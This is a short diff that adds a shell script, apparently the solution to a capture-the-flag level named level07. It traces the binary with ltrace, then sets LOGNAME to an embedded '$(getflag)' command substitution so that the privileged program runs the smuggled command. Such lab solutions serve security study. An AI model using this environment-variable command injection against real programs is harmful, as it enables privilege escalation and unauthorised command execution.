@@ -1,0 +1,6 @@
+ltrace ./level07
+
+export LOGNAME=\$\(getflag\)
+env | grep LOGNAME
+
+./level07
